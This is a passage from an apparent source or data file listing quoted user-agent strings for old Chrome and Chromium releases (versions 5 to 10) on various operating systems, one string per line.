"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.82 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux armv7l; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.127 Chrome/10.0.648.127 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU; AppleWebKit/534.16; KHTML; like Gecko; Chrome/10.0.648.11;Safari/534.16)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.0 Chrome/10.0.648.0 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.0 Chrome/10.0.648.0 Safari/534.16",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.0 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.642.0 Chrome/10.0.642.0 Safari/534.16",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.639.0 Safari/534.16",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.638.0 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.634.0 Safari/534.16",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.634.0 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 SUSE/10.0.626.0 (KHTML, like Gecko) Chrome/10.0.626.0 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.612.3 Chrome/10.0.612.3 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.612.1 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.611.0 Chrome/10.0.611.0 Safari/534.15",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.602.0 Safari/534.14",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML,like Gecko) Chrome/9.1.0.0 Safari/540.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Ubuntu/10.10 Chromium/9.0.600.0 Chrome/9.0.600.0 Safari/534.14",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.600.0 Safari/534.14",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.599.0 Safari/534.13",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.84 Safari/534.13",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.44 Safari/534.13",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.19 Safari/534.13",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.107 Safari/534.13 v1416758524.9051",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.107 Safari/534.13 v1416748405.3871",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.107 Safari/534.13 v1416670950.695",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.107 Safari/534.13 v1416664997.4379",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.107 Safari/534.13 v1333515017.9196",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.596.0 Safari/534.13",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/10.04 Chromium/9.0.595.0 Chrome/9.0.595.0 Safari/534.13",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/9.10 Chromium/9.0.592.0 Chrome/9.0.592.0 Safari/534.13",
"Mozilla/5.0 (X11; U; Windows NT 6; en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.587.0 Safari/534.12",
"Mozilla/5.0 (Windows U Windows NT 5.1 en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.583.0 Safari/534.12",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.579.0 Safari/534.12",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.576.0 Safari/534.12",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/8.1.0.0 Safari/540.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.558.0 Safari/534.10",
"Mozilla/5.0 (X11; U; CrOS i686 0.9.130; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.344 Safari/534.10",
"Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.343 Safari/534.10",
"Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.341 Safari/534.10",
"Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.339 Safari/534.10",
"Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.339",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Ubuntu/10.10 Chromium/8.0.552.237 Chrome/8.0.552.237 Safari/534.10",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/533.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.210 Safari/534.10",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.200 Safari/534.10",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.551.0 Safari/534.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.548.0 Safari/534.10",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.544.0 Safari/534.10",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.15) Gecko/20101027 Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.9 (KHTML, like Gecko) Chrome/7.0.531.0 Safari/534.9",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.8 (KHTML, like Gecko) Chrome/7.0.521.0 Safari/534.8",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.24 Safari/534.7",
"Mozilla/5.0 (X11; U; Linux x86_64; fr-FR) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.498.0 Safari/534.6",
"Mozilla/5.0 (ipad Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.498.0 Safari/534.6",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/7.0.0 Safari/700.13",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.63 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.53 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.33 Safari/534.3",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.470.0 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.463.0 Safari/534.3",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.462.0 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.462.0 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.461.0 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.461.0 Safari/534.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.461.0 Safari/534.3",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.460.0 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.460.0 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.460.0 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.459.0 Safari/534.3",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.1 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.1 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.1 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.1 Safari/534.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.1 Safari/534.3",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.0 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.0 Safari/534.3",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.457.0 Safari/534.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.456.0 Safari/534.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.454.0 Safari/534.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.454.0 Safari/534.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.453.1 Safari/534.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.453.1 Safari/534.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.453.1 Safari/534.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.451.0 Safari/534.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.1 SUSE/6.0.428.0 (KHTML, like Gecko) Chrome/6.0.428.0 Safari/534.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.428.0 Safari/534.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.428.0 Safari/534.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.428.0 Safari/534.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.422.0 Safari/534.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.417.0 Safari/534.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.416.0 Safari/534.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.414.0 Safari/534.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.9 (KHTML, like Gecko) Chrome/6.0.400.0 Safari/533.9",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.8 (KHTML, like Gecko) Chrome/6.0.397.0 Safari/533.8",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/6.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.999 Safari/533.4",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.70 Safari/533.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.127 Safari/533.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.126 Safari/533.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; fr-FR) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.126 Safari/533.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.125 Safari/533.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.370.0 Safari/533.4",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.368.0 Safari/533.4",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.2 Safari/533.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.0 Safari/533.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.0 Safari/533.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.363.0 Safari/533.3",
"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
"Mozilla/5.0 (X11; U; x86_64 Linux; en_GB, en_US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.357.0 Safari/533.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.356.0 Safari/533.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.355.0 Safari/533.3",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.353.0 Safari/533.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.353.0 Safari/533.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.343.0 Safari/533.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.343.0 Safari/533.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.7 Safari/533.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.7 Safari/533.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.5 Safari/533.2",
